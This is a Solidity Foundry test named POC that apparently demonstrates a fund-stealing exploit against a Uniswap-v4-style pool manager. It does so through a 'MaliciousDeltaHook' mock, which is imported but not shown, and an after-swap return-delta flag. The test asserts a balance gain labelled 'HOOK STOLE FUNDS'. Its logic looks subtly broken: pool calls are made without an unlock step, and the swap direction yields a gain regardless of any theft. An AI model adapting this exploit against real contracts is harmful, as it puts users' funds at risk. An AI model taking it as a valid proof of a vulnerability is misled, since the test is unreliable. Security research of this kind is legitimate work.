// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "../src/types/PoolId.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";

contract POC is Test {
    using PoolIdLibrary for PoolKey;
    PoolManager manager;
    MockERC20 token0; MockERC20 token1; MaliciousDeltaHook hook;
    function setUp() public {
        manager = new PoolManager(address(this));
        token0 = new MockERC20("T0","T0",18); token1 = new MockERC20("T1","T1",18);
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);
        token0.mint(address(this), 1e27); token1.mint(address(this), 1e27);
        token0.approve(address(manager), type(uint256).max); token1.approve(address(manager), type(uint256).max);
        uint160 flags = uint160(Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address hookAddr = address(flags);
        deployCodeTo("MaliciousDeltaHook.sol:MaliciousDeltaHook", "", hookAddr);
        hook = MaliciousDeltaHook(hookAddr);
    }
    function test_afterSwapReturnDelta() public {
        PoolKey memory key = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3000, 60, IHooks(address(hook)));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0), "");
        manager.modifyLiquidity(key, ModifyLiquidityParams(-60, 60, 1e18, 0), "");
        uint256 bal0Before = token0.balanceOf(address(this));
        manager.swap(key, SwapParams(false, -0.1e18, TickMath.MAX_TICK - 1), "");
        uint256 bal0After = token0.balanceOf(address(this));
        console.log("Bal diff:", bal0After - bal0Before);
        assertGt(bal0After, bal0Before, "HOOK STOLE FUNDS VIA RETURN DELTA");
    }
}